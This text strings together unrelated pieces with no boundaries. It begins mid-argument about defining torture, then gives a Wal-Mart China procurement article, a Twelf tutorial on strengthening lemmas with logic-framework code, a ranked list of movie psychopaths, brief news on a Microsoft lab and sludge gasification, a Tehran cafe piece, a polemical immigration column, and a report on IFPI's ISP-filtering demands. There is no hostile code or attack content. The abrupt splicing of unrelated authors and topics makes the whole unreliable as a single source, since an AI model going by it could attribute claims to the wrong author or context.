This situational argument does not apply to the definition of “ torture , ” the letter states .
Hence the importance of restricting the definition of “ torture ” , such as the intensive efforts to avoid admitting that waterboarding is “ torture . ”
We should therefore push to define activities as “ torture ” wherever reasonable and not allow administration defenders to restrict it as they have .
In this light , see the Physicians for Human Rights / Human Rights Watch Leave No Marks .

Wal - Mart 's China inventory to hit US $ 18 b this year
By Jiang Jingjing ( China Business Weekly )
Updated : 2004-11-29 15:21
The world 's largest retailer , Wal - Mart Stores Inc , says its inventory of stock produced in China is expected to hit US $ 18 billion this year , keeping the annual growth rate of over 20 per cent consistent over two years .
The trend is expected to continue , company officials revealed .
" We expect our procurement stock from China to continue to grow at a similar rate in line with Wal - Mart 's growth worldwide , if not faster , " said Lee Scott , the president and CEO ( chief executive officer ) of Wal - Mart .
An unnamed company official also stated the firm will extend its procurement base from South China 's Pearl River Delta to the North and East China in the coming few years .
A market rumour says the retailer has its eyes on a 340,000 - square metre warehouse at a logistics garden of the Shanghai Waigaoqiao Bonded Area .
Scott covertly visited the site earlier this month , and hopes to own the whole warehouse to accommodate the firm 's further expansion in China .
At present , Wal - Mart has quite limited warehouse resources in East China .
Xu Jun , Wal - Mart China 's director of external affairs , ruled out the rumour , saying the CEO has never visited that or any other site for a warehouse .
Nevertheless , he said China is Wal - Mart 's most important supplier in the world .
The overseas procurement home office in Shenzhen , a city of South China 's Guangdong Province , has played a key role in the firm 's global purchasing business .
Wal - Mart shifted its overseas procurement centre from Hong Kong to Shenzhen in February 2002 to better serve the purchasing and exporting business .
" If Wal - Mart were an individual economy , it would rank as China 's eighth - biggest trading partner , ahead of Russia , Australia and Canada , " Xu said .
By the end of September , 2004 , the top seven trading partners to the Chinese mainland are the European Union , the United States , Japan , Hong Kong , ASEAN ( Association of Southeast Asian Nations ) , South Korea and China 's Taiwan Province , state statistics from the Ministry of Commerce .
Last year , the firm bought US $ 15 billion products from China , half from direct purchasing , the other from the firm 's suppliers in China .
More than 5,000 Chinese enterprises have established steady supply alliances with Wal - Mart .
Good quality and low price are the major attractions of the retailing giant .
Insiders point out Wal - Mart 's imports from China have largely influenced the US trade deficit in China , which is expected to reach US $ 150 billion this year .
Xu declined to comment if the anti-dumpling measures of the US Department of Commerce have impacted the firm 's procurement of textile commodities and household appliances in China , saying again that China is an important sourcing base for the firm .
So far , more than 70 per cent of the commodities sold in Wal - Mart are made in China .
Experts say Wal - Mart 's plan of increasing its procurement from China has granted the firm a positive corporate reputation in the country .
" Buying more products in China means more job opportunities , which helps the firm win not only the government 's hearts , but also the customers ' appreciations , " said Wang Yao , director of information department under the China General Chamber of Commerce .
In the United States , poor people find it possible to afford cheap " Made In China " products for their daily necessities , Wang said .
Wal - Mart , headquartered in Bentonville , Arkansas , entered China in 1996 .
It has opened 39 stores , including supercenters , " Sam's Clubs " and neighborhood markets in 15 cities around China , including Beijing , Harbin and Dalian .
It has recently announced the opening of its first store in Shanghai , slated for the middle of next year .
The firm has a total of 4,900 stores in 10 countries worldwide .

Strengthening in Logical Frameworks ( Twelf )
Many logic systems admit a weakening principle : a derived conclusion continues to hold when more assumptions are added .
Strengthening is the opposite : proving that the established conclusion holds given fewer assumptions .
Strengthening certainly is not generally valid and has to be proven case - by - case .
It seems strengthening is often needed when proving meta - theoretical properties such as totality of non-surjective endomorphisms of higher - order terms .
The article on Twelf Wiki < http://twelf.plparty.org/wiki/Strengthening>
shows an example of the need for strengthening and describes one solution , which relies on defining term equality .
In this article we demonstrate simpler examples requiring strengthening , and two surprisingly trivial solutions .
Quite literally , one solution deals with the problem head - on , whereas the second one avoids the problem in a round - about way .
The examples are inspired by staging calculi .
At the end we describe the real development , which gives perhaps the first formal proof of type preservation of primitive reductions in an expressive staged calculus with escapes , run and cross -staged persistence .
The type - preservation proof used both of our solutions and required two strengthening lemmas .
Throughout we use
Twelf – properly : we use the higher - order abstract syntax ( HOAS ) for higher - order terms , without ever resorting to concrete syntax for “ variables ” .
The complete code is available at < http://okmij.org/ftp/Computation/staging/> .
The simplest example requiring strengthening
Perhaps the simplest example to illustrate the need of strengthening is based on lambda - calculus with terms marked by either 1 or 0 .
The challenge is to implement a function that converts terms marked by 1 into those marked by 0 – and show its totality .
Our calculus is elementary : we define two marks , 0 and 1
mark : type .
0 : mark .
1 : mark .
and marked terms , built of applications and abstractions :
exp : mark -> type .
% name exp E. a : exp M -> exp M -> exp M. l : ( exp M -> exp M ) -> exp M .
Here is a sample term , marked with 1 :
t1 : exp 1 = a ( l [ x ] ( l [ y ] ( a x y ) ) ) ( l [ x ] x ) .
( in Haskell notation , it is ( \x -> \y -> x y ) ( \x -> x ) ) .
The definition of exp makes it clear that all subterms of a marked term have the same mark .
Our goal is to write a transformation taking a term marked by 1 and producing a term marked by 0 :
cp1 : exp 1 -> exp 0 -> type .
% mode cp1 +E1 - E2 .
It is almost like copying terms and hence straightforward :
cp1-a : cp1 ( a E1 E2 ) ( a E1 ' E2 ' ) <- cp1 E2 E2 ' <- cp1 E1 E1 '. cp1-l : cp1 ( l E1 ) ( l E1 ' ) <- ( {x}{x'} cp1 x x ' -> cp1 ( E1 x ) ( E1 ' x ' ) ) .
% block cp1 -l-bl : block {x: exp 1} {x ' : exp 0} { D:cp1 x x'} .
% worlds ( cp1-l- bl ) ( cp1 _ _ ) . % total { E1} ( cp1 E1 _ ) . %%
Does not pass !
The clause cp1 - a inductively handles applications .
To transform an abstraction , we assume a term x marked with 1 , a term x ' marked with 0 , and assume that x ' is the result of transforming x , see cp1 x x ' .
Under those assumptions , we transform the body of the abstraction , cp1 ( E1 x ) ( E1 ' x ' ) .
The notation ( E1 ' x ' ) means that E1 ' is a higher - order term applied to x ' .
That is , E1 ' is of the type exp 0 -> exp 0 .
The block declaration cp1 - l - bl lists our set of assumptions ; the regular worlds declaration asserts that cp1 is performed given no assumptions , or one set assumption cp1 - l - bl , or two sets of such assumptions ( with the different x and x ' across the sets ) , etc .
Our transformation procedure is obviously total : we can take any 1 - marked term , and , in finite time , always deliver the corresponding 0 - marked term .
We wish to state this formally , hence the % total assertion .
Twelf verifies it first by checking that the transformation is terminating .
It then checks that all pattern - matching is exhaustive : we have not missed a case .
Alas , the totality check fails and Twelf reports an error :
Totality : Output of subgoal not covered Output coverage error --- missing cases : { E1:exp 1 -> exp 1} { E2:exp 1 -> exp 0 -> exp 0} |- {x:exp 1} {x ' : exp 0} cp1 x x ' -> cp1 ( E1 x ) ( E2 x x ' ) .
In the clause cp1-l , we have introduced three assumptions : x , x ' and cp1 x x ' .
By writing ( E1 ' x ' ) we asked the Twelf system to “ factor out ” the dependence on x ' .
Implicitly we stated that the result of transforming ( E1 x ) depends only on x ' but not on x or cp1 x x ' ( more formally , the independence is seen from the fact E1 ' is used outside of the scope of x introduced via the universal quantification {x} in cp1 - l ) .
Twelf can see that the assumption cp1 x x ' cannot possibly enter the set of terms because the definition of the type family exp ( with constructors a and l ) shows that no term can contain anything of the type cp1 .
But terms may occur in terms , and so the result of transforming the body of the abstraction generally depends on both x and x ' .
We have not handled that general case , and so our transformation is not total .
Twelf ’s complaint is quite insightful : ( E1 x ) is the body of the abstraction that includes some term x ( “ the variable ” ) .
We transform the body replacing all those occurrences of x with x ' – and so the result should include only x ' but no x .
Thus Twelf demands the proof that we indeed replaced all those x with x ' .
Upon consideration , we can see that the result of transforming ( E1 x ) cannot really depend on , or contain , x .
After all , x is an expression marked by 1 and the result of transforming ( E1 x ) is an expression marked by 0 .
Any sub-expression of a marked expression is marked with the same mark .
Alas ,
Twelf cannot see this proof by itself and we have to write it down explicitly .
The reason
Twelf cannot see that proof by itself is because Twelf tracks the dependencies ( so - called subordination ) using only the names of the type families ( e.g. , exp ) but not their parameters ( e.g. , exp 0 or exp 1 ) .
Astonishingly , the most trivial way of writing this independence proof works .
We state that whenever a term marked by 0 appears to depend on a term marked by 1 , it actually does n’t .
Or , constructively , we assert the following proposition
strength : ( exp 1 -> exp 0 ) -> exp 0 -> type .
% mode strength +H -E .
For any implication exp 1 -> exp 0 , we can always constructively produce exp 0 .
Here is the proof , the detailed procedure of producing that exp 0 term :
- : strength ( [ x ] E ) E. -: strength ( [ x ] ( a ( E1 x ) ( E2 x ) ) ) ( a E1 ' E2 ' ) <- strength E1 E1 ' <- strength E2 E2 '. -: strength ( [ x ] ( l [ x ' ] ( E x ' x ) ) ) ( l E ' ) <- {x ' : exp 0} strength ( E x ' ) ( E ' x ' ) .
The first clause handles the case when E patently does not contain anything of the type exp 1 .
The rest of the clauses do straightforward induction on terms ; the last clause requires hypothetical reasoning to examine the body of the abstraction , and for that we introduce the assumption x ' of the type exp 0 .
Perhaps it is because of that hypothetical reasoning that Twelf cannot see the strengthening property on its own .
We assert that so defined procedure is total , i.e. , it is a constructive proof of the strength proposition :
% block strength - bl : block {x ' : exp 0} .
% worlds ( strength - bl | cp2 - l - bl ) ( strength _ _ ) .
% covers strength + H - E. % total { E} ( strength E _ ) .
The label cp2 - l -bl describes the set of assumptions of the improved cp2 procedure below ( in the actual code , it is defined in a forward declaration ) .
Twelf has verified the totality of strength , and so we can use it to write the improved transformation procedure , cp2 :
cp2 : exp 1 -> exp 0 -> type .
% mode cp2 +E1 - E2. cp2-a : cp2 ( a E1 E2 ) ( a E1 ' E2 ' ) <- cp2 E2 E2 ' <- cp2 E1 E1 '. cp2-l : cp2 ( l E1 ) E1 '' <- ( {x}{x'} cp2 x x ' -> cp2 ( E1 x ) ( E1 ' x x ' ) ) <- strength ( [ x ] ( l ( E1 ' x ) ) ) E1 ''.
% block cp2-l-bl : block {x: exp 1} {x ' : exp 0} {d:cp2 x x'} . % worlds ( cp2-l- bl ) ( cp2 _ _ ) . % total { E1} ( cp2 E1 _ ) .
The only difference from cp1 is in the clause cp2-l : by writing ( E1 ' x x ' ) we state that the result of transforming the body of the abstraction may depend not only on x ' but also on x .
We build the transformed abstraction under that additional assumption : ( [ x:exp 1 ] ( l ( E1 ' x ) ) ) .
Using strengthening , we then prove that ( l ( E1 ' x ) ) does not actually depend on x .
Now the totality assertion succeeds : cp2 is the total transformation of 1 - marked terms .
The complete code is available at < http://okmij.org/ftp/Computation/staging/strengthen.elf>
A more realistic example : type preservation
We have encountered the problem of strengthening in staged calculi , e.g. , when proving type preservation .
We outline the problem and the solution ; please see the complete code < http://okmij.org/ftp/Computation/staging/translation-problem.elf> for the full details .
We introduce a simple staged language , where each expression is annotated with the numeric stage label A .
The language has three forms of expressions : natural literals , addition , and fix ( i.e. , recursive functions ) .
exp : nat -> type .
% name exp E. n : nat -> exp A. % prefix 110 n. + : exp A -> exp A -> exp A. %infix left 154 +. fix : ( exp A -> exp A ) -> exp A .
We introduce a trivial type system with only one type , int , and the equally simple type - checking relation of E T :
of : exp A -> tp -> type .
%name of Q. % mode of +E *T .
Please see the code for details .
As in the previous section we write the procedure to downgrade the level of an expression
downgrade : exp ( 1 N ) -> exp N -> type .
% mode downgrade +E1 - E2 .
We are not that interested in proving downgrade is total .
Rather , we wish to prove a meta - theorem that downgrade is type preserving : if the original expression was typed , the downgraded expression shall be typed too .
We state that property as a constructive proposition :
dn -pres : downgrade E1 E2 -> of E1 T -> of E2 T -> type .
% mode dn-pres + PD +PTI - PTO .
That is , given any downgradeable expression E1 and its type derivation of E1 T ( the evidence that E1 is typed ) , we produce the typing derivation for the corresponding downgraded expression E2 .
The most interesting case is the following :
- : dn-pres ( dn-f PEH ) ( of - f PTH ) PTH '' <- ( {e :exp ( 1 A ) } {pt : of e int} {e ' : exp
A} {dn : downgrade e e'} {pt ' : of e' int} dn - pres dn pt pt ' -> dn-pres ( PEH e e' dn ) ( PTH e pt ) ( PTH ' e pt e' pt ' ) ) <- strength - of ( [ e ] [ pt ] ( of -f ( PTH ' e pt ) ) ) PTH '' .
Here , dn-f PEH of the type downgrade ( fix E1 ) ( fix E2 ) is the derivation of downgrading ( fix E1 ) into ( fix E2 ) .
We assume a term e of the type exp ( 1 A ) , and further assume it is typed ( the assumption pt : of e int ) .
Likewise we assume a typed term e' that is the result of downgrading e .
Finally , we assume that the downgrading from e to e' was type preserving .
Under those assumptions , we obtain the type derivation of the body of the downgraded fix , by inductively invoking dn - pres .
The resulting type derivation ( PTH ' e pt e' pt ' ) generally depends not only on the assumption e' and its typeability pt ' – but also on e and pt , which are in scope and could in principle occur in type derivations .
We must thus prove that we can remove the latter dependency .
Again , the formal statement of that proposition is surprisingly simple :
strength - of : ( {e : exp ( 1 N ) } of e T -> of ( E:exp N ) T ) -> of ( E:exp N ) T -> type .
% mode strength - of +H -P .
We assert that the typing derivation of E T for an expression E at the level N cannot depend on any N+1 - level expression e and the typing derivation of the latter .
Our proof is again constructive : from the corresponding implication we produce its conclusion without assuming the hypotheses .
The complete code has all details .
Other examples
The need for strengthening does occur ( although not frequently ) in other circumstances .
Here are the example from Twelf distribution .
One is “ Representation of Mini - ML expressions in Mini- ML * ” by David Swasey , file exercises / opt - eval / opt - rep1.elf .
It defines a transformation from one higher - order language to another .
Proving meta - theoretical properties of that translation ( totality , type preservation , etc ) requires strengthening .
The second , indirect solution
The second solution to strengthening is , too , trivial , albeit round - about .
We use the same problem as in Section 1 : in lambda - calculus whose terms are marked with 0 or 1 , implement a function that converts terms marked by 1 into those marked by 0 – and show its totality .
Rather than transforming exp 1 to exp 0 directly , we introduce terms expi M isomorphic to exp M , turn exp 1 to expi 1 and then transform expi 1 to exp 0 .
The advantage is that terms exp M cannot appear in expi M and vice versa , so exp M cannot depend on assumptions of the type {x : expi M} and vice versa .
We avoid strengthening altogether .
Here are a few details : we define intermediary , also marked , terms
expi : mark -> type .
% name expi _ Ei. a 2 : expi M -> expi M -> expi M. l2 : ( expi M -> expi M ) -> expi M .
that are clearly isomorphic to the terms exp M of the original calculus .
We can state the isomorphism formally ; however , we only need one direction of it : given any term exp M , we can always obtain the corresponding expi M :
exp - expi : exp M -> expi M -> type .
% mode exp- expi +E1 - E2 .
We show only the more complex case of transforming abstractions :
- : exp-expi ( l E1 ) ( l2 E1 ' ) <- {e:exp
M} {e2 : expi M} exp - expi e e2 -> exp - expi ( E1 e ) ( E1 ' e 2 ) .
% block bl - exp - expi : some { M : mark} block {e: exp
M} {e2 : expi
M} {t : exp - expi e e2}. % worlds ( bl - exp - expi ) ( exp - expi _ _ ) .
% total { E} ( exp - expi E _ ) .
Now Twelf verifies the totality assertion without any complaints that E1 ' could depend ( that is , include ) the assumption e , which is also present in the LF context .
Twelf now sees that E1 ' cannot include e .
Compared to Section 1 , converting an expression of the type exp M gives us the term of the type expi M .
The latter terms can only be constructed by l2 and a 2 ; neither constructor can take any argument of the type exp M or contain exp M elsewhere .
Strengthening is no longer needed .
The label - changing transformation now takes expi 1 rather than exp 1 as the source a term :
cpaux : expi 1 -> exp 0 -> type .
% mode cpaux +E1 - E2 .
Here is the interesting case
cpa-l : cpaux ( l2 E1 ) ( l E1 ' ) <- ( {x : expi 1} {x ' : exp 0} cpaux x x ' -> cpaux ( E1 x ) ( E1 ' x ' ) ) .
% block bl- cpaux : block {x : expi 1} {x ' : exp 0} {t : cpaux x x'}. % worlds ( bl - cpaux ) ( cpaux _ _ ) .
% total { E1} ( cpaux E1 _ ) .
Again ,
Twelf accepts the totality assertion without complaint because clearly no term of the type expi M may appear in the term exp M – in fact , expi was not even defined when exp was introduced .
Thus ( E1 ' x ' ) cannot depend on x .
What remains is a mere composition of the two above transformations
cpi : exp 1 -> exp 0 -> type .
% mode cpi +E1 - E2 . -: cpi E1 E2 <- exp - expi E1 E1 ' <- cpaux E1 ' E2 . % worlds ( ) ( cpi _ _ ) .
% total {} ( cpi _ _ ) .
The desired transformation now includes two steps : transforming the source expression into the isomorphic form , and changing the mark of the latter .
Albeit indirect , the solution avoids strengthening altogether .
A real example : type - preservation in an expressive staged calculus
The file < http://okmij.org/ftp/Computation/staging/lambda-am1.elf> is the formalization of the two - level call - by - value calculus lambda - a1v based on lambda - a of Taha and Nielsen ’s “ Environment Classifiers ” ( POPL03 ) .
The calculus supports manipulation and splicing in of the open code , running of the closed code , and cross-staged persistence .
The lambda - a1v calculus has been introduced in the paper Closing the Stage : From Staged Code to Typed Closures written with Yukiyoshi Kameyama and Chung - chieh Shan ( PEPM08 ) .
The file includes ( maybe the first ) formal proof that any non-value term can be decomposed into a pre-value and the context .
This is quite challenging given that the calculus supports the evaluation under lambda and so the context can cross the arbitrary number of dependent binders : variable binders include classifiers that must be bound , too , at that point .
In our staged calculus , all terms are marked by their stage , present and future .
This is quite like the examples in the earlier Sections .
There is also an operation to demote a term , which takes a future - stage - marked term and changes its mark so the term can be evaluated at the present stage .
Demotion is how a future - stage computation can be run .
Demotion rebuilds a term as it traverses it , changing the marks along the way .
The only special case is handling a cross-staged persistent ( CSP ) value .
The latter is a present - stage expression that was “ lifted ” to the future stage , i.e. , was encapsulated unevaluated .
The demotion operation merely removes the encapsulation , splicing CSP into the demoted code .
The type - preservation proof is at the end of the development .
The most complex part is proving that demotion is type preserving , in particular , that demoting an abstraction ( l [ x:exp ( 1q AL ) ] Body ) from the future stage ( marked by ( 1q AL ) ) to the present , marked as qt , stage yielding ( l [ x ' : exp qt ] Body ' ) is type preserving .
As in the simpler examples earlier , the proof proceeds by introducing assumptions {x : exp ( 1q AL ) } , {x ' : exp qt} and that x ' is the result of demoting x .
The challenge is to prove that Body ' does not actually depend on x .
That is no longer as simple as before : a future - stage expression exp ( 1q AL ) could actually occur in the demoted expression – because of CSP .
For example , consider the following future - stage term
( l [ x:exp ( 1q AL ) ] ( csp ( AL > x ) ) )
where AL > x is future - stage - x marked by classifier AL ( in the PEPM08 paper , we write ( l [ x ^AL ] %(<x > ^AL ) ) .
An attempt to run such future - stage computations does not type in MetaOCaml ; accordingly , the lambda - a1v calculus rejects such expressions as mis-typed , due to a special typing rule of CSP .
Our preservation proof must take into account that the demoted expression is typed and so possible CSPs are restricted in form .
Only then strengthening can be proven .
In our proof , we had to use both approaches to proving strengthening described in this article .
We had to prove a direct strengthening lemma
strength - tp-dem : csp-ok1 E -> ( {x:exp ( 1q AL ) } of x TV -> of E T ) -> of E T -> type .

There are so many different types of horror movies and sub -genres of horror movies that two big fans of horror movies may like completely different films .
While zombies , vampires , and werewolves all have their place , one of the most intriguing type of horror movie villains are psychopaths .
Human , yet incredibly evil , psychopaths are able to pass themselves off as another normal human being , yet how can you know that person standing next to you in an elevator is evil incarnate ?
While there are literally dozens and dozens of great psychopath movies , here is my list of the top ten movie psychopaths , based on charisma of the character , and scariness ( so even though Alfred Hitchcock ’s “ Psycho ” is a classic , you wo n’t see it on this list ) .
10 . Highwaymen 2003
This movie stars Jim Caviezel as the protagonist , Rennie Cray , a husband whose wife was murdered by Fargo , a serial killer who gets kicks murdering women with his 1972 Cadillac El Dorado .
Most of Fargo ’s body are prosthetics , but he managed to make his car like an extension of his body , and he travels around the country murdering women , and leaving clues to taunt Rennie as he tries to follow him from town to town .
Fargo is cruel and taunting , and he picks his victims out and hunts them down .
While the movie is an iffy B movie , Fargo is a great modern psychopath .

9 . The Good Son 1993
Macaulay Culkin as Henry Evans proves that you do n’t have to be an adult to be psychotic .
Something about having a boy that young with no regard for human life whatsoever is creepy beyond belief .
How often can a movie show a child smile , and you become chilled to the bone ?

8. Silence of the Lambs
1991
Hannibal Lecter is one of the most infamous and bone chilling psychopaths to ever grace the big screen .
Even more amazing is how long Lecter stays in your nightmares and gives you chills , considering in the movie “ Silence of the Lambs , ” this cultured , eloquent , and articulate cannibal and serial killer only has 17 minutes of total screen time .

7. Peeping Tom 1960
You have to hit the vaults to find this classic treasure .
This movie was so disturbing that Director Michael Powell ’s career never recovered after he directed this extremely controversial film .
This film features the psychopath as the main character , as insane voyeur Carl Boehm films his female victims ’ dying gasps as he impales them with a sharpened camera tripod .
Even 50 years later this film is still scene as a ground breaking film in psychological horror .

6 . The Night of the Hunter 1955
Movie psychopaths do n’t come much more terrifying than the one portrayed by Robert Mitchum .
He plays “ The Reverend ” Harry Powell , a religious fanatic who is on a crusade to rid the entire world of what he calls “ perfume smellin ’ things . ”
Reverend Powell is a twisted and murderous misogynist well known because of the switchblade he conceals in his pocket ( take a guess at what he uses that for ) and he has the words “ Love ” and “ Hate ” etched on his knuckles .
Mitchum ’s portrayal of this psychopath will stay with you long after the movie is over .

5. American Psycho 2000
Kudos to actor Christian Bale , who adopted a perfect American accent and a male model ’s physique to play the part of white collar psychopath Patrick Bateman – a Wall Street hot shot by day who spends his spare time as a blood thirsty butcher in this gory cinematic gem .
The scene where Bateman uses an axe to hack apart a rival piece by piece while dancing to Huey Lewis ’s “ Hip To Be Square ” is well deserving of its infamy .

4. The Shining 1980
Jack Nicholson as Jack Torrance , writer turned mad man .
“ Here ’s Johnny ! ” “ All work and no play makes Jack a dull boy … ”
One of the most convincing movie psychos of all time , that big insane grin and evil eyed look is so well known it ’s part of main stream cinema history .

3. Henry : Portrait of a Serial Killer 1986
What is so frightening about this film is how mundane the act of violent murders are to the psychopaths in this film .
It ’s just normal , like picking up the mail , or shopping for some groceries .
This film starts with a blue collar type of guy teaching a friend how to murder without getting caught .
This is loosely based on a real life story of a serial killer , and Michael Rooker ’s portrayal is unsettling because he seems like such a common man .
After watching this movie , even you ’re most normal of neighbors can seem threatening , if you ’re the paranoid type .

2. No Country for Old Men 2007
Javier Bardem as sociopath Anton Chigurh is nothing short of evil personified in this film .
Anton Chigurh almost took the top spot on this list , but one man barely held him off .
Ice water does n’t even begin to explain what runs through this psychopath ’s veins , and the inventive weapon , refusal to stop , and the strange code of honor ( heads or tails to see if you live or die — Friend - O ) makes him even more terrifying .
This is one of the best and most interesting psychopaths ever , which is appropriate since this is one of the best movies to come out in years .

1. Cape Fear 1991
Robert de Niro ’s character , convicted rapist Max Cady , goes to prison .
His defense attorney had a document that could have gotten him acquitted because the rape victim , a 16 year old girl , was promiscuous , but knowing what his client was like , he hid the document .
In prison , Cady learned to read and vowed revenge .
After 14 years in prison he tracks down the lawyer , starting by killing people related to the family .
The scene involving a bed and hand cuffs is one of the most disturbing in the history of psycho movies , and Max Cady is too insane , too vengeful to bump out of # 1 , even if it was close .

SAN FRANCISCO 
As other high - tech companies cut back on their research labs , Microsoft continues to increase its ranks of free - rein thinkers .
The company , which has research labs in Redmond , Wash . ; Beijing ; Cambridge , England ; Bangalore , India ; and Silicon Valley , will announce plans on Monday to open a sixth lab , in Cambridge , Mass . , in the Boston metropolitan area .
These are labs where people focus on science , not product development .
To lead the new lab , the company has appointed one of its veteran researchers , Jennifer Tour Chayes .
Dr. Chayes , 51 , who has a doctorate in mathematical physics , said , “ We believe that in the long run , putting money into basic research will pay off , but you have to wait longer for it . ”
Microsoft , beset by competitive pressures from companies like Google , sees first - rate research labs as more important than ever .
The company , which made a $ 44.6 billion bid for Yahoo last week as one way to compete with Google , wants a set of labs in place that can develop business opportunities that will pay off well into the future .
Florida ( TGW ) – Sanford , Florida will be the first municipality in all of North America to adopt the MaxWest gasification system which turns sludge from municipal waste facilities into energy .
MaxWest will build the facility at a wastewater treatment plant .
The end product of a sewer plant , wastewater sludge , also called biosolids , will be gasified in an enclosed primary gasifier to produce syngas .
In a continuous integrated process , the syngas will be oxidized in an enclosed thermal oxidizer to produce thermal energy .
For Sanford , the thermal energy will replace natural gas .
" Compared to the projected cost of natural gas , a fossil fuel , Sanford will save $ 9,000,000 over the 20 - year life of our contract , " said Paul Moore , the city 's utility director .
" This technology has provided us with the opportunity to save money while managing our waste stream and protecting the environment . "

Hip Haunts of Tehran : Top Nine Eateries and Cafes
The white - hot scene in the Iranian capital -- where strict laws dominate .
TEHRAN , Iran , Feb. 28 , 2008 --
Even without bars and clubs in the Islamic Republic of Iran , the capital city of Tehran still has its hip haunts – mostly restaurants and cafes , which stand in for other nightlife hangouts .
At a time when Iran is the focus of potential new sanctions and attention over its nuclear program , Tehran 's social life does n't seem to be suffering a slowdown .
While Iranians are known for their all - out house parties , some with contraband cocktails , Iranians are increasingly drawn out to Tehran 's budding eateries and hot spots .
Some are traditional while others look like they could be in Paris , New York or Tokyo – fitting for Iran 's youth bulge ( by one estimate the country has 20 million people under the age of 20 ) .
In part because no alcohol is served , eating out is an affordable affair for most out - of - town visitors .

To grasp American immigration policy , to the extent that it can be grasped , one need only remember that the United States forbids smoking while subsidizing tobacco growers .
We say to impoverished Mexicans ,  See this river ?
Do n’t cross it .
If you do , we ’ll give you good jobs , a driver ’s license , citizenship for your kids born here and eventually for you , school for said kids , public assistance , governmental documents in Spanish for your convenience , and a much better future .
There is no penalty for getting caught .
Now , do n’t cross this river , hear ? 
How smart is that ?
We ’re baiting them .
It ’s like putting out a salt lick and then complaining when deer come .
As parents , the immigrants would be irresponsible not to cross .
The problem of immigration , note , is entirely self - inflicted .
The US chose to let them in .
It did n’t have to .
They came to work .
If Americans had n’t hired them , they would have gone back .
We have immigration because we want immigration .
Liberals favor immigration because it makes them feel warm and fuzzy and international and all , and from a genuine streak of decency .
Conservative Republican businessman favor immigration , frequently sotto voce , because they want cheap labor that actually shows up and works .
It ’s a story I ’ve heard many times — from a landscaper , a construction firm , a junkyard owner , a group of plant nurserymen , and so on .
 We need Mexicans . 
You could yell  Migra !  in a lot of restaurants in Washington , and the entire staff would disappear out the back door .
Do we expect businessmen to vote themselves out of business ?
That ’s why we do n’t take the obvious steps to control immigration ( a thousand - dollar - a - day fine for hiring illegals , half to go anonymously to whoever informed on the employer ) .
In Jalisco , Mexico , where I live , crossing illegally is regarded as casually as pirating music or smoking a joint , and the coyotes who smuggle people across as a public utility , like light rail .
The smuggling is frequently done by bribing the border guards , who are notoriously corrupt .
Why corrupt ?
Money .
In the book De Los Maras a Los Zetas , by a Mexican journalist , I find an account of a transborder tunnel he knew of that could put 150 illegals a day across the border .
( I ca n’t confirm this . )
The price is about $ 2000 a person .
That ’s $ 300,000 a day , tax - free .
What does a border guard make ?
( And where can I find a shovel ? )
The author estimated that perhaps forty tunnels were active at any give time .
Certainly some are .
A woman I know says she came up in a restaurant and just walked out the door .
Let ’s hear it for Homeland Security :
All together now .
The amusing thing is the extent to which American policy is not to have a policy .
The open floodgates to the south are changing — have changed , will continue to change — the nature of the country forever .
You may think this a good thing or a bad thing .
It is certainly an important thing — the most important for us in at least a century .
Surely ( one might think ) it deserves careful thought , national debate , prudence , things like that .
But no .
In the clownishness that we regard as presidential campaigning , none of the contenders has much to say on the matter .
In a dance of evasion that has become customary , the candidates carefully ignore those matters of most import for the nation , since considering hard questions might be divisive .
War , peace , race , immigration , affirmative action , the militarization of the economy , the desirability of empire — these play no part in the electoral discussion .
We seem to regard large issues as we might the weather : interesting , but beyond control .
It ’s linger , loiter , dawdle and fumble and see what happens .
And so , while various conservative groups ( not including businessmen ) rush out to guard the borders , nice liberal professors in the Northeast hurried to learn Spanish to help local illegals settle in .
Many people , alienated from the United States by policies and trends they find odious , no longer care .
There is no national consensus .
The country fractures into a congeries of warring agglomerations and the resulting paralysis manifests itself in drift .
The problem with muddling through is that one may not like what lies on the other side of the muddle .
Some day we may look back on the question of immigration and see that it all worked out well in the end and wonder what the fuss was about .
Or we may not .
No one will be able to charge us with having thought things through .
There is much billingsgate about whether to grant amnesty .
The question strikes me as cosmetic .
We are not going to round up millions of people and physically throw them across the border .
Whether we should does n’t matter .
It ’s fantasy .
Too many people want them here , or do n’t care that they are here , or do n’t want to uproot families who have established new lives here .
Ethnic cleansing is ugly .
Further , the legal Latino population votes .
It ’s just starting to vote .
A bumper crop of Mexican - American kids , possessed of citizenship , are growing headlong toward voting age .
These are not throwable - out , even in principle .
People complain that Mexico does n’t seal the borders .
Huh ?
Mexico is a country , not a prison .
It has no obligation to enforce American laws that America declines to enforce .
Then there was the uproar when some fast - food restaurant in the US began accepting pesos .
Why ?
Mexican border towns accept dollars .
Next came outrage against Mexico because its consulates were issuing ID cards to illegals , which they then used to get drivers licenses .
Why outrage ?
A country has every right to issue ID to its citizens .
America does n’t have to accept them .
If it does , whose problem is that ?
If you want to see a reasonable immigration policy , look to Mexico .
You automatically get a ninety - day tourist visa when you land .
No border Nazis .
To get residency papers , you need two things ( apart from photographs , passport , etc. )
First , a valid tourist visa to show that you entered the country legally .
Mexico does n’t do illegal aliens .
Second , a demonstrable income of $ 1000 a month .
You are welcome to live in Mexico , but you are going to pay your own way .
Sounds reasonable to me .
You want a Mexican passport ?
Mexico allows dual citizenship .
You ( usually ) have to be a resident for five years before applying .
You also have to speak Spanish .
It ’s the national language .
What sense does it make to have citizens who ca n’t talk to anybody ?
It looks to me as though America thoughtlessly adopted an unwise policy , continued it until reversal became approximately impossible , and now does n’t like the results .
It must be Mexico ’s fault .

IFPI wants ISPs to block The Pirate Bay , filter P2P traffic
The International Federation of the Phonographic Industry ( IFPI ) wants European ISPs to build the copyright equivalent to the Chinese firewall , and its counting on the help of European lawmakers to achieve this goal .
The music industry association approached the EU parliament with a set of recommendations to " develop cooperations with ISPs " , something that the paper calls " key to the future of the music business . "
So what can ISPs do to cooperate , you might ask ?
Well , that 's easy : Just filter out any illegitimate content , block P2P protocols and block access to websites like The Pirate Bay .
That 's all .
Here 's what IFPI exactly has in mind : ISPs should use acoustic fingerprinting - based filtering solutions like the one industry darling Audible Magic is offering to block any transfer of unlicensed sound recordings .
The IFPI paper likens this to filtered / licensed P2P applications like iMesh and Kazaa , but it does n't even specify whether these filters should only affect P2P , meaning that possibly every song transfer via IM or FTP could be affected as well .
ISPs should also block any type of Bittorrent or Gnutella traffic .
From the paper :
And finally , ISPs are supposed to block " infringing websites " that are located in " rogue jurisdictions " or " refuse to cooperate " with the industry .
One example quoted is Allofmp3.com , another one is The Pirate Bay , a site the IFPI calls " an infamous infringing service locaded in Sweden " .
The German IT news website heise .
de is reporting that IFPI has succeeded in getting some political support for these ideas .
